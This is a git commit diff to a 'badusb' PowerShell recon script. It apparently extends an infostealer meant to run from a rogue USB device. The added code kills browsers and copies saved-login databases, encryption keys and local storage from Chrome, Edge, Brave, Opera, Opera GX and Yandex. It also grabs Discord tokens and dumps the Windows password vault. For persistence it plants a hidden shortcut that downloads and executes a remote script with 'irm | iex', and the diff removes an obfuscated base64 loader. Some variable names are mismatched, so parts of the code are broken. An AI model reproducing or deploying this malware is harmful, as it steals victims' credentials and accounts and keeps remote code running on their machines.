1d41df6ed0db0a97e1aabdd55dc7bb3d91c34d1c
sealldeveloper <120470330+sealldeveloper@users.noreply.github.com>
2023-01-26 17:24:54 +1100

    Update SeallDEV+jakoby-RECON.ps1

--- badusb/SeallDEV+jakoby-RECON/SeallDEV+jakoby-RECON.ps1
+++ badusb/SeallDEV+jakoby-RECON/SeallDEV+jakoby-RECON.ps1
@@ -541,6 +541,14 @@ function Get-BrowserData {
     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'opera'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/Opera Software/Opera Stable/History"}
+    elseif ($Browser -eq 'opera'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/Opera Software/Opera Stable/Bookmarks"}
+    elseif ($Browser -eq 'operagx'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/Opera Software/Opera GX Stable/History"}
+    elseif ($Browser -eq 'operagx'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/Opera Software/Opera GX Stable/Bookmarks"}
+    elseif ($Browser -eq 'yandex'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/../Local/Yandex/YandexBrowser/User Data/Default/History"}
+    elseif ($Browser -eq 'yandex'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/Yandex/YandexBrowser/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'brave'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/History"}
+    elseif ($Browser -eq 'brave'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
     
 
@@ -563,15 +571,45 @@ $vault = New-Object Windows.Security.Credentials.PasswordVault
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password >> $env:TMP\$FolderName\BrowserPasswords.txt
 
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "operagx" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "operagx" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "yandex" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "yandex" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
+function chromiumBrowser {
+	[CmdletBinding()]
+	param (
+	[Parameter (Position=1,Mandatory = $True)]
+	[String]$Path,
+	(Parameter (Position=1,Mandatory = $True)]
+	[String]$Browser
+	)
+
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\User Data\Local State"
+$logindata = "$path\User Data\default\Login Data"
+$preferences = "$path\User Data\default\Preferences"
+$localstorage = "$path\User Data\default\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
+
+}
 
 # Get FireFox Passwords
 taskkill /IM firefox.exe /F
@@ -585,25 +623,78 @@ echo $key4 > $env:TMP\$FolderName\Firefox\logins.json
 # Get Chrome Passwords
 taskkill /IM chrome.exe /F
 sleep 1
-New-Item -Path $env:tmp/$FolderName/Chrome -ItemType Directory
-$localstate = "$env:appdata\..\local\Google\Chrome\User Data\Local State"
-$logindata = "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data"
-$preferences = "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
-Copy-Item $localstate "$env:TMP\$FolderName\Chrome\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\Chrome\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\Chrome\Preferences"
-
+chromiumBrowser -Path "$env:appdata\..\local\Google\Chrome" -Browser "Chrome"
 
 # Get Edge Passwords
 taskkill /IM msedge.exe /F
 sleep 1
-New-Item -Path $env:tmp/$FolderName/Edge -ItemType Directory
-$localstate = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State"
-$logindata = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data"
-$preferences = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
-Copy-Item $localstate "$env:TMP\$FolderName\Edge\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\Edge\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\Edge\Preferences"
+chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
+
+# Get Brave Passwords
+taskkill /IM brave.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\BraveSoftware\Brave-Browser" -Browser "Brave"
+
+# Get Opera Passwords
+taskkill /IM opera.exe /F
+taskkill /IM launcher.exe /F
+sleep 1
+$path="$env:appdata\Opera Software\Opera Stable"
+$Browser="Opera"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Login Data"
+$preferences = "$path\Preferences"
+$leveldb = "$path\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+
+# Get OperaGX Passwords
+taskkill /IM opera.exe /F
+taskkill /IM launcher.exe /F
+sleep 1
+$path="$env:appdata\Opera Software\Opera GX Stable"
+$Browser="OperaGX"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Login Data"
+$preferences = "$path\Preferences"
+$leveldb = "$path\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+
+# Get Yandex Passwords
+taskkill /IM browser.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
+
+############################################################################################################################################################
+
+function discordStorage {
+	[CmdletBinding()]
+	param (
+	[Parameter (Position=1,Mandatory = $True)]
+	[String]$Path,
+	(Parameter (Position=1,Mandatory = $True)]
+	[String]$Browser
+	)
+
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$localstorage = "$path\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
+}
+
+# Discord Token Grabbing
+
+discordStorage -Path "$env:appdata\discord" -Browser "Discord"
+discordStorage -Path "$env:appdata\discordcanary" -Browser "DiscordCanary"
+discordStorage -Path "$env:appdata\discordptb" -Browser "DiscordPTB"
 
 ############################################################################################################################################################
 
@@ -704,11 +795,15 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
+if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
+	$data = "`$dc='$dc';irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
+	$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
+}
 if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
 	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
 	$target = "powershell"
-	$args = "-Nop -Noni -w h -ep bypass -command `"( NEw-ObjeCt  SYsTeM.iO.ComPrESSion.deflAtestrEaM([IO.mEmORYstrEAm] [cONvErt]::fROMbASE64sTriNG( 'S1BJSbZVBxLq1plFuQoZJSUFxVb6+mmZOanFesWpiTk5eimpZfpJiSmlxUn6wSABF9cw7azE7PykSt0gV2d/P72CYkOFGoXM1AoA' ),[io.COmPreSSioN.CompreSSIONmODe]::DECOmPresS) |foREAch-oBjeCT{ NEw-ObjeCt  sYsTeM.Io.sTrEaMreADeR( $_, [sysTem.text.EncoDing]::asCii) }|fOreAch-oBjeCT{ $_.rEAdtOenD( )})|&( $shellId[1]+$sheLlId[13]+'x')"
+	$args = "-Nop -Noni -w h -ep bypass -command `".\msiserver.ps1`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
